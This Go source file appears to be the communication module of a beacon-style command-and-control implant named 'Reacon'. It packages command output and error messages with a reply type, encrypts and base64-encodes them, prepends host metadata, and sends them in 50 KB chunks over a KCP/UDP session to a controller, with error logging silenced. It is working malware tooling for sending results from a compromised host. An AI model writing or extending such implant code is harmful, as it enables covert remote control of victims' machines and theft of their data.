package communication

import (
	"Reacon/pkg/encrypt"
	"Reacon/pkg/utils"
	"bytes"
	"encoding/binary"
	"fmt"
	"github.com/xtaci/kcp-go/v5"
	"sync"
)

func ErrorProcess(err error) {
	errMsgBytes := []byte(err.Error())
	result := errMsgBytes
	fmt.Println(err)
	criticalSection(31, result)
}

func DataProcess(callbackType int, b []byte) {
	result := b
	var err error
	if callbackType == 0 {
		result, err = utils.CodepageToUTF8(b)
		if err != nil {
			ErrorProcess(err)
		}
	}
	criticalSection(callbackType, result)
}

var mutex sync.Mutex

func criticalSection(callbackType int, b []byte) {
	mutex.Lock()

	finalPaket := MakePacket(callbackType, b)
	finalPaket, _ = encrypt.Encrypt(finalPaket)
	finalPaket, _ = encrypt.EncodeBase64(finalPaket)

	MetaLen := len(utils.MetaInfo)
	MetaLenBytes := utils.WriteInt(MetaLen)

	msg := utils.BytesCombine(MetaLenBytes, utils.MetaInfo, finalPaket)

	normalDataInt := 2
	normalDataBytes := utils.WriteInt(normalDataInt)
	msgToSend := utils.BytesCombine(normalDataBytes, msg)

	Send(msgToSend, utils.KCPClient)
	mutex.Unlock()
}
func Send(msg []byte, conn *kcp.UDPSession) {
	defer func() {
		if err := recover(); err != nil {
			//log.Println("Send error:", err)
		}
	}()

	if conn == nil {
		//log.Println("Connection not established")
		return
	}

	bufferSize := len(msg)
	bufferSizeBytes := utils.WriteInt(bufferSize)

	msgToSend := utils.BytesCombine(bufferSizeBytes, msg)

	const chunkSize = 50 * 1024 // 50 KB
	var chunk []byte

	for bytesSent := 0; bytesSent < len(msgToSend); {
		if len(msgToSend)-bytesSent > chunkSize {
			chunk = msgToSend[bytesSent : bytesSent+chunkSize]
		} else {
			chunk = msgToSend[bytesSent:]
		}

		_, err := conn.Write(chunk)
		if err != nil {
			//log.Println("Failed to send data:", err)
			return
		}

		bytesSent += len(chunk)
	}

}

// replyType(4) | result  并加密
func MakePacket(replyType int, b []byte) []byte {
	buf := new(bytes.Buffer)

	replyTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(replyTypeBytes, uint32(replyType))
	buf.Write(replyTypeBytes)

	buf.Write(b)

	encrypted, err := encrypt.Encrypt(buf.Bytes())
	if err != nil {
		return nil
	}

	buf.Reset()

	buf.Write(encrypted)

	return buf.Bytes()

}
